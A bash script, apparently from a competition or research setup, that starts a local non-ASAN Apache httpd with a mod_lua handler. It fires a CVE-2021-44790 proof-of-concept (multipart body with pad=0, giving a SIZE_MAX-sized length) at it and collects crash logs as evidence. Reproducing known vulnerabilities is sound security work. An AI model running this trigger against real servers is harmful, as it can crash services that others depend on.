#!/bin/bash
# 非 ASAN 构建的 44790 崩溃证据（无 ASAN 时的判定依据）
set -u
ROOT="/mnt/e/强网拟态/cve/apache"
EVID="$ROOT/evidence/CVE-2021-44790"
PREFIX=/opt/httpd
mkdir -p "$EVID" "$PREFIX/lua"
sed 's/Listen 8082/Listen 8083/; s/ServerName 127.0.0.1:8082/ServerName 127.0.0.1:8083/' \
  "$ROOT/conf/httpd-44790.conf" > "$PREFIX/conf/httpd-44790-plain.conf"
cp -f "$ROOT/conf/lua/parsebody.lua" "$PREFIX/lua/parsebody.lua"
pkill -f "$PREFIX/bin/httpd" 2>/dev/null || true
sleep 0.7
cd "$PREFIX"
: > logs/error_log
: > logs/access_log
"$PREFIX/bin/httpd" -f "$PREFIX/conf/httpd-44790-plain.conf" -DFOREGROUND \
   > "$EVID/plain_console.log" 2>&1 &
HPID=$!
for i in $(seq 1 40); do curl -s -o /dev/null http://127.0.0.1:8083/ && break; sleep 0.25; done
{
  echo "== normal (non-ASAN) httpd =="
  "$PREFIX/bin/httpd" -v
  sha256sum "$PREFIX/bin/httpd"
  echo "lua handler probe:"
  curl -sS -w '\nhttp=%{http_code}\n' -X POST http://127.0.0.1:8083/parsebody -H 'Content-Type: text/plain' --data 'x'
  echo "== send multipart pad=0 (vlen=SIZE_MAX-3, huge apr_pcalloc) =="
  python3 "$ROOT/poc/CVE-2021-44790/poc.py" 127.0.0.1 8083 /parsebody 0
  sleep 2
  echo "== error_log tail =="
  tail -15 logs/error_log
} > "$EVID/plain_build_abort_evidence.txt" 2>&1
cp -f logs/error_log "$EVID/plain_build_error_log.txt" 2>/dev/null || true
cp -f logs/access_log "$EVID/plain_build_access_log.txt" 2>/dev/null || true
kill "$HPID" 2>/dev/null || true
sleep 0.5
pkill -f "$PREFIX/bin/httpd" 2>/dev/null || true
echo "=== saved ==="; cat "$EVID/plain_build_abort_evidence.txt"
